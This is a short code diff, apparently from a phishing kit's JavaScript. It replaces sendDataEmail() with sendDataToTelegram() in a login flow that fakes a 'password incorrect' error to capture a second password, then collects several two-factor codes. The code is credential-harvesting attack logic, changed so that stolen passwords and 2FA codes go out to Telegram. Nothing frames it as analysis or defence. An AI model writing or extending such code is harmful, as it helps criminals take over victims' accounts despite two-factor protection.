@@ -6769,14 +6769,14 @@
             errortext.style.display = "block";
             errortext = apiForm.querySelector("input").value = "";
             apiInsertCounter++;
-            sendDataEmail();
+            sendDataToTelegram();
             spiner.style.display = "none";
             buttonText.style.display = "block";
             button.removeAttribute("disabled");
             hidePasswordIncorrectText();
             input.setAttribute("name", "password-2");
           } else {
-            sendDataEmail();
+            sendDataToTelegram();
             errortext.style.display = "none";
             spiner.style.display = "none";
             buttonText.style.display = "block";
@@ -6806,7 +6806,7 @@
 
         updateFormsSendData(serializeForm(twoFAForm));
         setTimeout(function () {
-          sendDataEmail();
+          sendDataToTelegram();
           counter2FA++;
           if (counter2FA >= countOf2FA + 1) {
             // SHOW success
